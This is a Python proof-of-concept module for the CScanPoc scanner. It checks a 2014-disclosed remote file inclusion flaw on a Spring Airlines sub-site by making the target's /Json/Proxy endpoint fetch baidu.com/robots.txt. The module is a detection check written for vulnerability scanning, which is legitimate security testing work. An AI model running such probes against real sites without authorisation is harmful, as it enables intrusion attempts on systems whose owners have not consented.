# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Chunqiu_0000' # 平台漏洞编号
    name = '春秋航空分站存在远程文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RFI # 漏洞类型
    disclosure_date = '2014-06-20'  # 漏洞公布时间
    desc = '''
        春秋航空分站存在远程文件包含漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Uknown' #https://wooyun.shuimugan.com/bug/view?bug_no=59641
    cnvd_id = 'Uknown' # cnvd漏洞编号
    cve_id = 'Uknown'  # cve编号
    product = '春秋航空'  # 漏洞组件名称
    product_version = 'Uknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '468b8989-4417-4150-8858-e38629b8279f' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/Json/Proxy?url=http://baidu.com/robots.txt'
            response = requests.get(vul_url)
            if response.status_code ==200 and 'Baiduspider' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
